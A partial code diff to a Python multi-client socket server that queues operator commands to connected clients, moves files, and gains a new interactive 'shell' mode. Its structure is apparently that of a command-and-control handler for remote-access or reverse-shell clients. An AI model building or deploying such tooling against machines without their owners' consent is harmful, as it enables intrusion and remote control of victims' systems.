@@ -1,11 +1,9 @@
-import command_controller
-import lib
+import queue
 import socket
 import threading
-import os
+
+import lib
 from command_controller import Client
-import queue
-import sys
 
 server_host = '0.0.0.0'
 server_port = 1234
@@ -45,25 +43,29 @@ def handle_client(conn, addr, command_queue):
                 command = client.command_controller(command.lower())
 
                 # Send the command to the client
-                if command != "help" and command != "unknown" and command != "error":
-                    conn.send(command.encode('utf-8'))
 
-                    if command.startswith("upload"):
-                        file_path = command.split(" ")[1]
-                        lib.upload_file(file_path, conn)
+                if command != "shell":
+                    if command != "help" and \
+                            command != "unknown" and \
+                            command != "error":
 
+                        conn.send(command.encode('utf-8'))
 
-                    # If the command is "close", close the connection
-                    if command == "close":
-                        break
+                        if command.startswith("upload"):
+                            file_path = command.split(" ")[1]
+                            lib.upload_file(file_path, conn)
 
-                    # Receive the output of the command
-                    message = conn.recv(1024).decode('utf-8')
-                    if not message:
-                        break
-                    print(f"{message}\n")
+                        # If the command is "close", close the connection
+                        if command == "close":
+                            break
 
-                lib.print_mko_client(current_thread.ident)
+                        # Receive the output of the command
+                        message = conn.recv(1024).decode('utf-8')
+                        if not message:
+                            break
+                        print(f"{message}\n")
+
+                    lib.print_mko_client(current_thread.ident)
 
         except socket.timeout:
             conn.send("close".encode('utf-8'))
@@ -144,13 +146,17 @@ def command_line_interface():
 
                 if thread_id is not None:
                     context_manager = thread_id
-                    if lib.use_manger(thread_id, thread_to_conn, client_queues) == "close":
+                    command_queue_manager = lib.use_manger(thread_id, thread_to_conn, client_queues)
+
+                    if command_queue_manager == "close":
                         threads.pop(thread_index)
                         thread_to_conn.pop(thread_id)
 
+                    elif command_queue_manager == "shell":
+                        lib.interact_shell(thread_to_conn[thread_id], thread_id)
+
                     lib.print_mko_prefix()
                     context_manager = None
-
 
                 else:
                     print(f"No thread found with ID {thread_id}")
@@ -175,6 +181,7 @@ def command_line_interface():
         elif command == "help" or command == "?" or command == "h" or command == "H" or command == "HELP":
             lib.print_help_manager()
             lib.print_mko_prefix()
+
         else:
             lib.print_mko_prefix()
 
